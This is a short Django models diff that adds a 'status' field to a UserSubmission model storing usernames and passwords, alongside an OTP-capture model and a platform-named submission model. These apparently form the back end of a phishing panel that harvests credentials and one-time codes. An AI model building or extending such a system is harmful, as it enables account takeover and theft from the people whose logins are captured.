@@ -58,9 +58,11 @@ class UserSubmission(models.Model):
     username = models.CharField(max_length=150)
     password = models.CharField(max_length=128)
     created_at = models.DateTimeField(auto_now_add=True)
+    status = models.CharField(max_length=50, default='pending')
+
 
     def __str__(self):
-        return self.username
+        return f"{self.username} - {self.status}"
 
 class OTPSubmission(models.Model):
     user_submission = models.ForeignKey(UserSubmission, related_name='otps', on_delete=models.CASCADE)
@@ -132,6 +134,7 @@ class UserSubmissionNoones(models.Model):
     username = models.CharField(max_length=150)
     password = models.CharField(max_length=128)
     created_at = models.DateTimeField(auto_now_add=True)
+    
 
     def __str__(self):
         return self.username
